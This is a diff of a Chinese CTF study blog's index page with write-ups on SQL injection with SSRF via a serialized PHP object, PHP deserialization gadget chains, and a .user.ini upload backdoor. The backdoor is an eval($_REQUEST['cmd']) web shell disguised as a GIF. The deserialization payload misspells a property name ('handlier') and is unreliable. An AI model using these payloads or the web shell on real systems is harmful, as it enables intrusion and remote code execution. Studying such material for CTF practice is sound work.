+<p>通过目录扫描找到关键几个目录<br>![[.&#x2F;images&#x2F;Pasted image 20260308203735.png]]<br>方法一：<br><code>load_file(&quot;/var/www/html/flag.php&quot;) 读取文件</code><br>方法二：<br>通过修改blog值达到ssrf的作用<br>尝试</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>修改后访问找到读取到的base64加密flag<br><code>&lt;iframe width=&#39;100%&#39; height=&#39;10em&#39; src=&#39;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg==&#39;&gt;</code></p>
+
       
     </div>
 
@@ -673,7 +809,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/06/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/06/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -687,7 +823,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2026/03/06/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">CTF反序列化</a>
+            <a href="/2026/03/06/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">CTF文件上传</a>
         </h2>
 
         <div class="post-meta">
@@ -698,10 +834,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2026-03-06 00:00:00 / 修改时间：17:38:36" itemprop="dateCreated datePublished" datetime="2026-03-06T00:00:00+08:00">2026-03-06</time>
+              <time title="创建时间：2026-03-06 00:00:00" itemprop="dateCreated datePublished" datetime="2026-03-06T00:00:00+08:00">2026-03-06</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-08 10:11:52" itemprop="dateModified" datetime="2026-03-08T10:11:52+08:00">2026-03-08</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -723,27 +865,14 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="反序列化Unser"><a href="#反序列化Unser" class="headerlink" title="反序列化Unser"></a>反序列化Unser</h2><p>php中的两个函数<code>serialize  unserialize</code></p>
-<p>反序列化对象如果为已经存在的类则会调用魔术方法</p>
-<ol>
-<li><code>__construct</code> : 构造函数，在对应对象实例化时被自动调用</li>
-<li><code>__wakeup</code> : 在对象反序列化时调用</li>
-<li><code>__sleep</code> : 在对象序列化时被调用</li>
-</ol>
-<p>序列化时会先调用 <code>sleep</code> 再调用 <code>destruct</code>, 故而完整的调用顺序为: <br><code>sleep</code> -&gt; <code>(变量存在)</code> -&gt; <code>destruct</code></p>
-<p>反序列化时如果有 <code>__wakeup</code> 则会调用 <code>__wakeUp</code> 而不是 <code>__construct</code>, 故而逻辑为 <code>__wakeUp/__construct</code> -&gt; <code>(变量存在)</code></p>
-<p><em><strong>PHP一些函数</strong></em></p>
-<p><code>A instanceof B</code> 运算符: <strong>用于判断一个变量是否是某个类、其父类或实现某接口的实例</strong>，如果是，返回 <em>true</em>，否则返回 <em>false</em></p>
-<p><code>is_callable()</code> 用于<strong>检测一个变量的值在当前作用域中是否可以作为函数或方法调用</strong>，常用于回调验证</p>
-<p><code>call_user_func()</code> 是PHP中的一个功能强大的函数，它允许你调用一个回调函数，并传递给它一些参数。这个函数非常灵活，可以用来调用全局函数、类方法，甚至是闭包</p>
-<p><code>___invoke()</code> 是一种特殊的魔术方法，用于让对象像函数一样被调用。当你尝试以函数调用的方式执行一个对象时，PHP 会自动调用该对象的 __<em>invoke()</em> 方法。此特性自 <strong>PHP 5.3.0</strong> 起可用，并且必须声明为 <em>public</em></p>
-<p><code>file_get_contents()</code> 本地文件读取或者远程读取 如果为可执行文件则执行后返回结果<br>	此处有php:&#x2F;&#x2F;filter, data:&#x2F;&#x2F;, 伪协议实现base64加密后文件的读取</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="ezunser"><a href="#ezunser" class="headerlink" title="ezunser"></a>ezunser</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key </span>= <span class="string">&#x27;welcome&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$store</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __destruct</span>() &#123;  </span><br><span class="line">        <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="variable">$this</span>-&gt;store <span class="keyword">instanceof</span> Store) &#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;key);  <span class="comment">//此处创建了Store实例</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Store</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handler</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function get</span>(<span class="variable">$key</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="title function_ invoke__">is_callable</span>(<span class="variable">$this</span>-&gt;handler)) &#123;  </span><br><span class="line">            <span class="keyword">return</span><span class="title function_ invoke__"> call_user_func</span>(<span class="variable">$this</span>-&gt;handler, <span class="variable">$key</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileInvoker</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file </span>= <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __invoke</span>(<span class="variable">$key</span>) &#123;        <span class="variable">$path </span>= <span class="variable language_">$this</span>-&gt;file;  </span><br><span class="line">        <span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="variable">$path</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SafeNote</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text </span>= <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __toString</span>() &#123;  </span><br><span class="line">        <span class="keyword">return</span><span class="title function_ invoke__"> </span>(<span class="keyword">string</span>) <span class="variable language_">$this</span>-&gt;text;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;    <span class="variable">$data </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];  </span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&lt;!-- POST data=serialized_string --&gt;\n&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+          <h1 id="file-upload"><a href="#file-upload" class="headerlink" title="file_upload"></a>file_upload</h1><pre><code>.user.ini文件
+</code></pre>
+<p>只要是以fastcgi运行的php都可以用这个方法<br><code>.user.ini</code>文件作为php配置文件 可利用利用配置项构造后门</p>
+<pre><code>auto_append_file  指定一个文件，自动包含在要执行的文件后
+auto_prepend_file  指定一个文件，自动包含在要执行的文件前
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">|-- .user.ini //配置文件</span><br><span class="line">|-- shell.jpg //伪装成图片的后门</span><br><span class="line">|-- index.php //网站正常文件</span><br><span class="line"></span><br><span class="line">.user.ini内容：</span><br><span class="line">——————</span><br><span class="line">auto_prepend_file=shell.jpg</span><br><span class="line">——————</span><br><span class="line"></span><br><span class="line">shell.jpg内容：</span><br><span class="line">——————</span><br><span class="line">GIF89a //图片头绕过检测</span><br><span class="line">&lt;?=eval($_REQUEST[&#x27;cmd&#x27;]);?&gt; //一句话木马</span><br><span class="line">——————</span><br><span class="line"></span><br><span class="line">即可在访问网站所有php文件时自动执行shell</span><br></pre></td></tr></table></figure>
 
-
-<p>构造序列化payload <a target="_blank" rel="noopener" href="https://onecompiler.com/">php online </a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">	  <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;anything&#x27;</span>;</span><br><span class="line">	  <span class="keyword">public</span> <span class="variable">$store</span>;</span><br><span class="line">	  </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Store</span></span>&#123;</span><br><span class="line">	  <span class="keyword">public</span> <span class="variable">$handlier</span>;</span><br><span class="line">	  </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">FileInvoker</span></span>&#123;</span><br><span class="line">	  <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$cache</span> = <span class="keyword">new</span> <span class="title class_">Cache</span>();</span><br><span class="line">	<span class="variable">$store</span> = <span class="keyword">new</span> <span class="title class_">Store</span>();</span><br><span class="line">	<span class="variable">$fileinvoker</span> = <span class="keyword">new</span> <span class="title class_">FileInvoker</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$store</span>-&gt;handlier = <span class="variable">$fileinvoker</span>;</span><br><span class="line">	<span class="variable">$cache</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$cache</span>);</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>运行得到：<code>O:5:&quot;Cache&quot;:2:{s:3:&quot;key&quot;;s:8:&quot;anything&quot;;s:5:&quot;store&quot;;O:5:&quot;Store&quot;:1:{s:8:&quot;handlier&quot;;O:11:&quot;FileInvoker&quot;:1:{s:4:&quot;file&quot;;s:5:&quot;/flag&quot;;}}}</code></p>
 
       
     </div>
@@ -896,91 +1025,6 @@
 <pre><code>Django报错的结构
 </code></pre>
 <p>![[..&#x2F;images&#x2F;djangoerror.png]]</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/06/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Ducklinger">
-      <meta itemprop="description" content="分享日常">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ducklinger">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/03/06/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">CTF文件上传</a>
-        </h2>
-
-        <div class="post-meta">
-
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2026-03-06 00:00:00" itemprop="dateCreated datePublished" datetime="2026-03-06T00:00:00+08:00">2026-03-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-03-08 10:11:52" itemprop="dateModified" datetime="2026-03-08T10:11:52+08:00">2026-03-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="file-upload"><a href="#file-upload" class="headerlink" title="file_upload"></a>file_upload</h1><pre><code>.user.ini文件
-</code></pre>
-<p>只要是以fastcgi运行的php都可以用这个方法<br><code>.user.ini</code>文件作为php配置文件 可利用利用配置项构造后门</p>
-<pre><code>auto_append_file  指定一个文件，自动包含在要执行的文件后
-auto_prepend_file  指定一个文件，自动包含在要执行的文件前
-</code></pre>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">|-- .user.ini //配置文件</span><br><span class="line">|-- shell.jpg //伪装成图片的后门</span><br><span class="line">|-- index.php //网站正常文件</span><br><span class="line"></span><br><span class="line">.user.ini内容：</span><br><span class="line">——————</span><br><span class="line">auto_prepend_file=shell.jpg</span><br><span class="line">——————</span><br><span class="line"></span><br><span class="line">shell.jpg内容：</span><br><span class="line">——————</span><br><span class="line">GIF89a //图片头绕过检测</span><br><span class="line">&lt;?=eval($_REQUEST[&#x27;cmd&#x27;]);?&gt; //一句话木马</span><br><span class="line">——————</span><br><span class="line"></span><br><span class="line">即可在访问网站所有php文件时自动执行shell</span><br></pre></td></tr></table></figure>
-
 
       
     </div>
